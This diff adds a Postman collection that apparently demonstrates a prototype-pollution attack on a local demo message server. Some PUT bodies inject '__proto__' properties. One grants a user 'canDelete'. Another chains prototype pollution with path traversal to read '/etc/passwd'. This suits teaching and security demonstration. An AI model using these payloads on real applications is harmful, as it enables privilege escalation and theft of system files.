@@ -1,0 +1,255 @@
+{
+	"info": {
+		"_postman_id": "caea7317-05af-490e-b4e9-a147c5f2e722",
+		"name": "prototype-pollution-demo",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "get msgs",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "localhost:3000.",
+					"host": [
+						"localhost"
+					],
+					"port": "3000."
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "put msg",
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"message\": {\"text\": \"Hi!\"}}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "delete request - admin ",
+			"request": {
+				"method": "DELETE",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"admin\", \"password\": \"???\"}, \"messageId\": 1}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "put-msg with proto - delete",
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"message\": { \"text\": \"😈\", \"__proto__\": {\"canDelete\": true}}}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "delete as user",
+			"request": {
+				"method": "DELETE",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"messageId\": 1}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "put-msg with proto - report",
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"message\": { \"text\": \"😈\", \"__proto__\": {\"reportId\": 1}}}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "get report",
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"} }"
+				},
+				"url": {
+					"raw": "http://localhost:3000/report",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"report"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "get user",
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"} }\n"
+				},
+				"url": {
+					"raw": "http://localhost:3000/user_proto",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"user_proto"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "put-msg with proto - report - passwd",
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "content-type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"message\": { \"text\": \"😈\", \"__proto__\": {\"reportId\": \"../../../../../etc/passwd\"}}}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
